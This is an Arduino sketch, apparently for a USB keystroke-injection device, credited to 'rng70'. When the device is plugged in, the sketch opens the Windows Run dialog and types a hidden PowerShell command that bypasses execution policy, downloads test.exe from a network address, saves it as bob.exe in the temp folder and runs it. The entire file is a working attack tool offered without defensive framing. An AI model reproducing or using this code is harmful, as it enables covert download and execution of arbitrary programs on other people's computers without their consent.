/* ------------------- */
/*     by rng70        */
/* ------------------- */

#include "Keyboard.h"

void typeKey(int key){
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

/* Init function */
void setup(){
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.138/test.exe',\\\"$env:temp\\bob.exe\\\"); Start-Process \\\"$env:temp\\bob.exe\\\"\"");

  typeKey(KEY_RETURN);
  delay(500);
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
